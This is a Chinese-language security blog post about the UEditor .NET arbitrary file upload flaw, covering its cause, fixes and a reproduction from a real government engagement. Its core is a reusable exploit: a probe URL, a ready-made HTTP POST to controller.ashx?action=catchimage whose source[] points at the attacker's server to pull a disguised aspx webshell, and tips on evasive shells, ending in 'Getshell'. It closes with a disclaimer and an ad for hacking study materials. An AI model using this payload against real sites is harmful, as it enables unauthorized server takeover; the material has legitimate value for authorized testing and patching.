# 原创
：  UEditor 任意文件上传漏洞

# UEditor 任意文件上传漏洞

##### 前言

前段时间在做某政府单位的项目的时候发现存在该漏洞，虽然是一个老洞，但这也是容易被忽视，且能快速拿到shell的漏洞，在利用方式上有一些不一样的心得，希望能帮助到一些还不太了解的小伙伴，故此写了此篇文章。

### 一、 漏洞简介

##### 1.1 漏洞描述

Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php,jsp,asp版本不受此UEditor的漏洞的影响，.net存在任意文件上传，绕过文件格式的限制，在获取远程资源的时候并没有对远程文件的格式进行严格的过滤与判断。

##### 1.2 影响范围

该漏洞影响UEditor的.Net版本，其它语言版本暂时未受影响。

##### 1.3 漏洞原理

漏洞的成因是在获取图片资源时仅检查了ContentType，导致可以绕过达到任意文件上传。

##### 1.4 漏洞修复

1.修改工程目录下net/App_Code/CrawlerHandler.cs文件，添加对文件类型检查的代码。<br/> 2.使用各类WAF软件，防止攻击者上传恶意文件。<br/> 3.检查文件上传路径下是否有近期上传的畸形图片；检查是否存在asp，aspx等类型危险文件。如果发现异常文件，请判断后及时删除。

### 二、漏洞复现

##### 首先

我们进入到该系统的后台，通过挨个功能点的查看最终再此位置发现了一个Ueditor的编辑器。

##### 第一步：

验证码漏洞是否存在：拼接漏洞URL地址<br/> UEditor/net/controller.ashx?action=catchimage

显示 {“state”:”参数错误：没有指定抓取源”}<br/> 就基本可以继续尝试漏洞利用

##### 第二步：漏洞利用

##### 1、先谈一下部分人可能存在的误区

例如：很多小伙伴当看网上文章的时候，看到要构造写一个HTML的文件上传脚本，需要把自己服务器上的图片码上传到漏洞站点的时候。

第一种：有些不太了解的小伙伴在网上看到一些以下位置的复现报告的时候，有的就会说Windows系统没法命名文件带?号的，比如：xxx.jpg?.aspx 格式的。

第二种：我没有Linux服务器怎么办，没法在Windows系统的服务器上用这种带问号？格式的文件怎么办，之类这样的困惑。

很多小伙伴就还真被误导进去了。

##### 1.1 误区解惑

网上很多文章并没有详细说明一些看似简单的方法步骤，但却有时候会容易让不太了解的人，产生误导。

这里我来详细解惑：<br/> 重点：<br/> 第一点：就是直接用图片码哪怕不需要图片码内容绕过的都可以，有时候直接一个稍微免杀的aspx的码改为jpg格式都行。最终示个人遇到的实际情况而定。<br/> 第二点：不需要用到Linux服务器，直接Windows服务器即可。

从上图实践中可以看出，哪怕是Linux系统类型的服务器，你用格式为 xxx.jpg?.aspx 的文件上传也是不行的，哪怕你的服务器目录存在该文件，也会显示404

##### 正确成功的方法

下图可以看到上传成功返回上传的路径

##### 2、这里我个人经验常用推荐使用的方法：

（墙裂推荐大家，或者嫌麻烦想省事的朋友使用）

##### 2.1 个人推荐：数据包构造法

原因：当你用网上很多写用什么HTML文件的方式上传，抓包你会发现其实上传的数据包是这样的。

由此我们可以换个思路想到，为何不直接用该数据包呢，以后每次遇到该编辑器漏洞，都可尝试用该数据包修改部分内容即可直接使用。方便又快捷。

##### 通用数据包：

```
POST /替换漏洞URL地址拼接/UEditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: x.x.x.x
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="100", "Chromium";v="100", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

source[]=http://替换为自己服务器开启http服务的URL地址/666.jpg?.aspx

```

最后上传成功，Getshell

该编辑器还有其他漏洞如SSRF，存储型xss等，这里就不在过多赘述，感兴趣的小伙伴可自行网上搜索尝试。

该类型漏洞现在还是有不少，只要细心去发现。<br/> 希望此篇文章对大家能有所帮助，觉得对你有所帮助的小伙伴，可以评论加点赞！<br/> 谢谢！

 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
